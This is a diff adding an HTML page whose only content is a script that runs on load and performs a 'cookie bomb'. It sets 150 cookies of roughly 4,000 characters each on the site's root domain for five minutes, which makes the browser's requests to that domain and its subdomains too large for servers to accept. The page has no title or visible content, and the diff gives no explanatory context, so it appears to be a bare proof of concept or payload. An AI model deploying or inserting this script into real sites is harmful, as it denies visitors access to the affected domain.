@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title></title>
+</head>
+
+<body>
+<script type="text/javascript">
+(function () {
+  'use strict';
+
+  function getRootDomain() {
+    return window.location.host.match(new RegExp('[^\.]*\.[^\.]*$'));
+  }
+
+  function nowMillis() {
+    return (new Date()).getTime();
+  }
+
+  function setCookie(key, value, expires) {
+    var domain = getRootDomain();
+    document.cookie = key + "=" + escape(value) +
+      ";path=/;domain=" + domain + "; expires=" + expires.toUTCString();
+  }
+
+  function setCookieBomb() {
+    var value =
+      'Boring',
+      i,
+      key,
+      // Expire cookies 5 minutes from now.
+      expires = new Date(nowMillis() + 5 * 60 * 1000);
+
+    for (i = value.length; i < 4000; i += 1) {
+      value += '_';
+    }
+
+    for (i = 0; i < 150; i += 1) {
+      key = 'key' + i.toString();
+      setCookie(key, value, expires);
+    }
+  }
+
+  setCookieBomb();
+
+}());
+
+</script>
+
+</body>
+</html>
